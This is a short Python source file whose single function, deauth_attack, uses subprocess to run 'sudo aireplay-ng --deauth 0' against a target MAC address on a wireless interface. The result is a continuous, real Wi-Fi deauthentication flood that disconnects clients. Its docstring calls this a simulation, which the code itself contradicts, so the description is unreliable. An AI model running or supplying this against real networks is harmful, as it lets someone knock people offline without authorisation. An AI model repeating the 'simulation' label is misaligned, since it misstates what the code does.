import subprocess

def deauth_attack(target_mac, interface='wlp0s20f3'):
    """
    Simulates a deauthentication attack on the specified target MAC address.

    Parameters:
    target_mac (str): The target MAC address for the deauth attack.
    interface (str): The network interface to use for the attack (default is 'wlp0s20f3').

    Returns:
    str: A message indicating the status of the deauth attack.
    """
    try:
        # Example command to perform deauth attack using aireplay-ng
        subprocess.Popen(["sudo", "aireplay-ng", "--deauth", "0", "-a", target_mac, interface])
        return f"Deauth attack started on {target_mac}"
    except Exception as e:
        return f"Deauth attack failed: {str(e)}"